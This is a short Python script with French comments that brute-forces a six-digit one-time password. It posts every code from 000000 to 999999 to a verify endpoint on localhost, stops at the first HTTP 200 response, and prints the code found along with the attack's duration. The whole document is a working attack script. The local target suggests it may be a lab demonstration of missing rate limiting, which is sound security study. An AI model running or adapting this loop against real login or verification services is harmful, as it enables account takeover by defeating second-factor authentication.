import requests
import time

url = "http://127.0.0.1:5000/verify"
start_time = time.time() # début

for i in range(0, 1000000):
    otp = f"{i:06d}"  # format sur 6 chiffres
    response = requests.post(url, json={"otp": otp})

    if response.status_code == 200:
        end_time = time.time()  # fin
        duration = end_time - start_time
        print(f"[+] OTP trouvé : {otp}")
        print(f"Durée de l'attaque : {duration:.4f} secondes")
        break
    else:
        print(f"[-] Essai : {otp}")
